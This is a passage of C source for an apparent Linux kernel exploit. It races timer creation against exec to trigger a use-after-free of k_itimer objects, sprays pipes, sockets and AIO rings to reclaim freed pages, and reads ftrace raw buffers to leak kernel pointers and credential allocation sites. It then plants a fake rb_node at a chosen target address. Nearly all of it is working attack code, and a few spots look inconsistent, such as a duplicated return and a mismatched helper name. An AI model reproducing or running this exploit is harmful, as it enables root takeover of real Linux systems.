					near_dist = d;
					nearest = pfn;
					near_ord = ord;
				}
			}
		}
	}
	dprintf(STDOUT_FILENO,
		"[free-diag] base=%#" PRIx64 " free=%d batched=%d alloc=%d cover_base=%d "
		"ord0=%d ord1=%d ord2+=%d bytes=%ld nearest=%#" PRIx64 "/%d\n",
		base, frees, batched, allocs, cover_base,
		ord_count[0], ord_count[1], ord_count[2] + ord_count[3] +
		ord_count[4] + ord_count[5] + ord_count[6] + ord_count[7] +
		ord_count[8] + ord_count[9] + ord_count[10],
		bytes, nearest, near_ord);
	return nearest != 0 && near_dist <= 4 ? 1 : 0;
}

/* The trace task field ends in "-<pid> ".  During the reclaim window only
 * this process is writing the candidate socket pages; an allocation from a
 * kworker or another process does not prove that our fake node owns the page. */
static int trace_task_is_self(const char *line)
{
	char self[32];
	int n = snprintf(self, sizeof(self), "-%d ", (int)getpid());
	return n > 0 && (size_t)n < sizeof(self) && strstr(line, self) != NULL;
}

static int trace_task_is_spray(const char *line)
{
	char self[32];
	for (int i = 0; i < FAST_SPRAY_THREADS; i++) {
		int tid = atomic_load_explicit(&g_fast_tids[i], memory_order_acquire);
		int n;
		if (tid <= 0)
			continue;
		n = snprintf(self, sizeof(self), "-%d ", tid);
		if (n > 0 && (size_t)n < sizeof(self) && strstr(line, self))
			return 1;
	}
	return 0;
}

/* Was the target pfn allocated by this process during the reclaim window?
 * A PFN-only match is unsafe: an unrelated allocation can be mistaken for a
 * successful plant, after which waitpid() walks arbitrary rb_node pointers.
 *
 * prefer_cpu is the cpu the reclaim writes are pinned to (pf.cpu); its
 * buffer is scanned first because the alloc events can only live there.
 * Every cpu still gets its own tail budget — the old shared forward
 * budget let cpu0's dump starve cpu>=1 (see TRACE_SCAN_BUDGET note).
 *
 * g_alloc_cover counts mm_page_alloc lines covering @pfn BEFORE the task
 * filter, so a miss can be classified: cover=0 means our writes never
 * allocated the page; cover>0 means the page was allocated but not
 * provably by us (task-field mismatch). */

/* 4 KiB-slab reclaim: the freed page is a single order-0 page, so the
 * order>=1 two-half rule above cannot match it.  Accept any allocation that
 * contains exactly this page, but only from a spray worker: the main thread's
 * own faults must never be mistaken for the planted tile. */
static int raw_find_alloc_page(uint64_t pfn, int prefer_cpu)
{
	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	if (ncpu < 1) ncpu = 1;
	if (ncpu > 16) ncpu = 16;
	g_alloc_cover = 0;
	int seq[16], nseq = 0;
	if (prefer_cpu >= 0 && prefer_cpu < ncpu)
		seq[nseq++] = prefer_cpu;
	for (int cpu = 0; cpu < ncpu; cpu++)
		if (cpu != prefer_cpu)
			seq[nseq++] = cpu;
	for (int s = 0; s < nseq; s++) {
		int cpu = seq[s];
		long n = raw_read_cpu(cpu);
		for (long i = 16; i + 12 <= n; i += 4) {
			uint64_t head;
			int order, pid;
			if ((raw_u32((unsigned char *)g_tt_buf + i - 8) & 0xffff) !=
			    (uint32_t)g_raw_alloc_id)
				continue;
			head = raw_u64((unsigned char *)g_tt_buf + i);
			order = (int)raw_u32((unsigned char *)g_tt_buf + i + 8);
			if (order < 0 || order > 10)
				continue;
			/* A single 4 KiB page is only proven by an order-0
			 * allocation at exactly that pfn; a larger block has the
			 * same object-offset ambiguity as above. */
			if (order != 0 || head != pfn)
				continue;
			g_alloc_cover++;
			pid = (int)raw_u32((unsigned char *)g_tt_buf + i - 4);
			/* Sequential mode (raw trace unavailable) sprays from the
			 * main thread; the fast workers do not exist then. */
			if (!raw_pid_is_ours(pid))
				continue;
			dprintf(STDOUT_FILENO,
				"[raw-alloc-hit] cpu=%d pid=%d pfn=%#" PRIx64
				" order=%d\n", cpu, pid, head, order);
			return 1;
		}
	}
	return 0;
}

static int find_page_alloc(uint64_t pfn, int prefer_cpu)
{
	if (g_raw_active)
		return raw_find_alloc(pfn, prefer_cpu);
	int ncpu = cpu_count();
	int seq[16], nseq = 0;
	g_alloc_cover = 0;
	if (prefer_cpu >= 0 && prefer_cpu < ncpu)
		seq[nseq++] = prefer_cpu;
	for (int cpu = 0; cpu < ncpu && nseq < 16; cpu++)
		if (cpu != prefer_cpu)
			seq[nseq++] = cpu;
	for (int s = 0; s < nseq; s++) {
		int cpu = seq[s];
		char path[128];
		struct trace_tail *t;
		size_t budget = TRACE_SCAN_BUDGET;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		t = trace_tail_open(path);
		if (!t)
			continue;
		while (budget && trace_tail_next(t)) {
			size_t used = strlen(t->line) + 1;
			if (used >= budget) {
				budget = 0;
				break;
			}
			budget -= used;
			if (!strstr(t->line, "mm_page_alloc:"))
				continue;
			/* PORT (2026-11-11): hard hit only.  A single order>=1
			 * allocation whose 8 KiB-aligned range covers both halves is
			 * the kmalloc-8k slab the socket write fills with the plant
			 * pattern.  An order-0 cover can be any anonymous page (the
			 * trace scanner's own heap fault) and carries no tile, so
			 * accepting it lets waitpid() walk stale rb_node garbage. */
			{
				uint64_t head = 0;
				int order = 0;
				uint64_t base = pfn & ~UINT64_C(1);
				if (!pfn_event_covers(t->line, pfn, &head, &order))
					continue;
				g_alloc_cover++;
				if (order != 1 || head != base)
					continue;
				if (!trace_task_is_self(t->line))
					continue;
			}
			dprintf(STDOUT_FILENO, "[alloc-hit] cpu=%d %s\n", cpu, t->line);
			trace_tail_close(t);
			return 1;
		}
		trace_tail_close(t);
	}
	return 0;
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	for (int i = 0; i < 256 && total < (4UL << 30); i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]))
			break;
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (16 << 20)) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0)
				break;
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[sock] pairs=%d MiB=%lu\n", g_nsocks, total >> 20);
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used, size_t limit)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget;
	if (fd < 0)
		return -1;
	/* poll() on trace_pipe_raw is not trustworthy, and a blocking read costs
	   the whole alarm budget. Spin on EAGAIN with a 1 ms nap instead: the
	   records are already in the ring buffer by the time we get here. */
	budget = limit ? 120 : 150;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) {
			*used += (size_t)n;
			if (limit && *used >= limit)
				break;
			budget = limit ? 120 : 150;
			continue;
		}
		if (n == 0)
			break;
		if (errno != EAGAIN && errno != EINTR) {
			close(fd);
			return -1;
		}
		usleep(1000);
	}
	close(fd);
	return 0;
	close(fd);
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0, n_any = 0;
	/* Foreign processes create timers on the same cache; a victim slab that
	 * still holds one of their live objects never empties, so its page is
	 * never returned to the buddy (observed as page_freed=0 forever on a
	 * busy boot).  Keep a self-pid-only list and fall back to the unfiltered
	 * one if this kernel's record pid field is not what we expect. */
	uint64_t *any = malloc(sizeof(g_all));
	int want_tid = 0;
	if (!buf)
		return -1;
	if (!any) {
		free(buf);
		return -1;
	}
	if (ipc)
		want_tid = atomic_load_explicit(&ipc->timer_tid,
						memory_order_acquire);
	memcpy(needle, &site, 8);
	*chosen = 0;
	if (read_raw(buf, 8U << 20, &used, 0)) {
		free(buf);
		free(any);
		return -1;
	}
	fd = 0; /* the shared reader owns the fd now */
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		if (got != site || req != GEO_KITIMER_SIZE || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n_any < (int)(sizeof(g_all) / sizeof(g_all[0])))
			any[n_any] = ptr;
		n_any++;
		if (want_tid > 0) {
			int pid = 0;
			if (i >= 4)
				memcpy(&pid, buf + i - 4, 4);
			if (pid != want_tid)
				continue;
		}
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	if (n < 3 && n_any >= n) {
		/* pid field unusable: keep the legacy unfiltered behaviour. */
		memcpy(g_all, any, sizeof(g_all));
		n = n_any > (int)(sizeof(g_all) / sizeof(g_all[0]))
			? (int)(sizeof(g_all) / sizeof(g_all[0])) : n_any;
		*chosen = (index < n) ? g_all[index] : 0;
	}
	free(buf);
	free(any);
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO,
		"[uaf] captured=%d self=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, n_any, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		if (got != site || req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	free(buf);
	return n;
}

/* Read-only diagnostics for the cred capture.  A miss here aborted the whole
 * chain with only "site recs=0", which cannot distinguish a wrong slide from
 * a missing trace record.  These globals record what the raw stream actually
 * contained so the next failure is diagnosable without another guess. */
struct diag_site {
	uint64_t site;
	int count;
};
#define DIAG_MAX_SITES 8
static struct diag_site g_diag_cred_sites[DIAG_MAX_SITES];
static int g_diag_cred_nsites;
static struct diag_site g_diag_timer_sites[DIAG_MAX_SITES];
static int g_diag_timer_nsites;
static size_t g_diag_raw;
static int g_diag_cred_size_recs;
static int g_diag_timer_size_recs;
static int g_diag_expected_hits;
static int g_diag_pid_hits;

static void diag_add_site(struct diag_site *arr, int *n, uint64_t site)
{
	for (int i = 0; i < *n; i++) {
		if (arr[i].site == site) {
			arr[i].count++;
			return;
		}
	}
	if (*n < DIAG_MAX_SITES) {
		arr[*n].site = site;
		arr[*n].count = 1;
		(*n)++;
	}
}

static int collect_site_pid(uint64_t site, uint64_t bytes, int want_pid,
			    uint64_t *ptrs, int cap, int *n_seen)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0, seen = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	g_diag_raw = used;
	/* Histogram every allocation record with a kernel call site and a
	 * direct-map object pointer, for both the cred and k_itimer sizes.
	 * This is independent of the configured slide, so a wrong slide shows
	 * up as expected-site misses while plausible sites still appear here. */
	for (size_t i = 4; i + 32 <= used; i++) {
		uint64_t hs, hp, hr;
		memcpy(&hs, buf + i, 8);
		if ((hs >> 48) != 0xffff)
			continue;
		memcpy(&hp, buf + i + 8, 8);
		if ((hp >> 48) != 0xffff || (hp & 7))
			continue;
		memcpy(&hr, buf + i + 16, 8);
		if (hr == GEO_CRED_SIZE) {
			g_diag_cred_size_recs++;
			diag_add_site(g_diag_cred_sites, &g_diag_cred_nsites, hs);
		} else if (hr == GEO_KITIMER_SIZE) {
			g_diag_timer_size_recs++;
			diag_add_site(g_diag_timer_sites, &g_diag_timer_nsites, hs);
		}
	}
	for (size_t i = 4; i + 32 <= used; i++) {
		uint64_t got, ptr, req;
		uint32_t pid;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 16, 8);
		if (got != site || req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		seen++;
		g_diag_expected_hits++;
		if (want_pid >= 0) {
			memcpy(&pid, buf + i - 4, 4);
			if ((int)pid != want_pid)
				continue;
		}
		g_diag_pid_hits++;
		if (n < cap)
			ptrs[n++] = ptr;
	}
	free(buf);
	if (n_seen)
		*n_seen = seen;
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	int made = 0;
	atomic_store_explicit(&ipc->timer_tid, (int)syscall(SYS_gettid),
			      memory_order_release);
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(thread_clock(i % 3), &armed_event, &extra))
			_exit(120);
		g_tids[i] = extra;
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	while (atomic_load_explicit(&ipc->arm_ready, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	for (int i = 0; i < 3; i++) {
		int idx = ipc->arm_idx[i];
		if (idx < 0 || idx >= 2048)
			continue;
		if (timer_settime(g_tids[idx], 0, &spec, NULL))
			_exit(120);
	}
	dprintf(STDOUT_FILENO, "[exec] armed %d/%d/%d\n", ipc->arm_idx[0],
		ipc->arm_idx[1], ipc->arm_idx[2]);
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	while (!atomic_load_explicit(&ipc->exec_ready, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec] begin tid=%ld\n", (long)syscall(SYS_gettid));
	atomic_store_explicit(&ipc->exec_entered, 1, memory_order_release);
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

static int raw_has_ptr(uint64_t ptr)
{
	uint8_t needle[8];
	int cpu;
	memcpy(needle, &ptr, 8);
	for (cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 4096 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n < 0) {
					if (errno == EINTR)
						break;
					break;
				}
				if (n == 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		dprintf(STDOUT_FILENO, "[freeobj] cpu%d raw_bytes=%zu\n", cpu, used);
		for (size_t i = 0; i + 8 <= used; i++) {
			if (!memcmp(buf + i, needle, 8)) {
				free(buf);
				dprintf(STDOUT_FILENO, "[freeobj] ptr on cpu%d raw_bytes=%zu\n",
					cpu, used);
				return 1;
			}
		}
		free(buf);
	}
	return 0;
}

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	/* The filemap event is not emitted for AIO ring pages on 6.12, so the
	 * pfn->ring lookup above cannot identify the owner. Plant the fake node
	 * into every mapped AIO ring instead: if the target page is any of them,
	 * the later rb_erase sees our node. */
	{
